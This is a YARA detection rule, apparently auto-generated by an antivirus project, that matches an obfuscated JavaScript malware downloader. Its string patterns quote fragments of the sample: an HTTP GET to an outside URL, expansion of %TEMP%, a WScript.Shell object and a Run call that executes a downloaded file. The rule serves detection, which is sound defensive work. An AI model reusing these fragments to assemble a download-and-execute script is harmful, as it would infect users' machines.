rule sig_20160427_f19f7d48b05dadca95152eb552e2cfec {
  meta:
    description = "datamaliciousorder - file 20160427_f19f7d48b05dadca95152eb552e2cfec.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7672fce9bc8da3c4b4cdc9b2f484e64df876967d115c9077d18ff3e5d793abdf"

  strings:
    $s1  = "UbromVxtxd[YfhsiJqhpo](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function VbykeVrifb() {return DpjaaTvfps[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JyknZre" ascii
    $s3  = "function VbykeVrifb() {return DpjaaTvfps[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JyknZre" ascii
    $s4  = "var DpjaaTvfps = function DuxldMxjgb() {return MgjhdWlwea[AnccnXzbbf](\"WScript\"+\".Shell\");}(), SinnzNtxct = 11;" fullword ascii
    $s5  = "function ApwvuPsbdk(KjkaiZaaot, MlopuFwyop){ZinimLunrn = ZinimLunrn * 1; return KjkaiZaaot - MlopuFwyop;};" fullword ascii
    $s6  = "var MgjhdWlwea = this[\"WScript\"];" fullword ascii
    $s7  = "function IlujzCfvfj(){return SgbnaXelwe + \"\";};" fullword ascii
    $s8  = "if (UbromVxtxd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function SdymbTfrwu() {return ((FukjgGrsbx == true) && (FukjgGrsbx == OchdfGrswo)) ? 1 : ZinimLunrn;};" fullword ascii
    $s10 = "OchdfGrswo = true; " fullword ascii
    $s11 = "var OchdfGrswo = false;" fullword ascii
    $s12 = "}while (DqksmRlxyz);" fullword ascii
    $s13 = "var NwqegHoozt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function CpjzkIrjnq(YshdmByvyk){DpjaaTvfps[\"R\"+\"un\"](YshdmByvyk, ZinimLunrn, ZinimLunrn);};" fullword ascii
    $s15 = "return ApwvuPsbdk(XsxvnDneee, YjarnLbatg);" fullword ascii
    $s16 = "var FukjgGrsbx = false;" fullword ascii
    $s17 = "RycpdFimux = true;" fullword ascii
    $s18 = "function SfaszPkanb(){return 23;};" fullword ascii
    $s19 = "function LlgtlXehir(){return AnccnXzbbf;};" fullword ascii
    $s20 = "function EajhtWoztc()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}